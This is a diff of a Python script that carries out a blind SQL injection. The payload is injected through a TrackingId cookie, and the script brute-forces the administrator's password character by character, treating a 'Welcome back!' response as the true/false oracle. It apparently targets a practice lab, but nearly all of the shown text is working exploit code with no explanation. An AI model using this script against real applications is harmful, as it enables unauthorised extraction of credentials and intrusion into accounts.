@@ -25,11 +25,24 @@ def get_pass_len(url):
     return False
 
 def get_admin_pass(url, pass_len):
-    payload = "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'a' --"
+    password = ""
 
     for i in range (1, pass_len+1):
-        for j in range ()
+        for j in range (32,127):
+            payload = "' AND (SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username = 'administrator') = '%s'-- " %(i,j)
+            cookie = {
+                "TrackingId" : "i8mWW3GvMxGRTL34" + payload,
+                "session" : "zBZZ6rtNCFIEI957MgCNLcnEaktuR9c4"
+            }
+            res = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
 
+            sys.stdout.write('\r' + password + chr(j))
+            sys.stdout.flush()
+            
+            if "Welcome back!" in res.text:
+                password += chr(j)
+                break
+    return password
 
 if __name__ == "__main__":
     try:
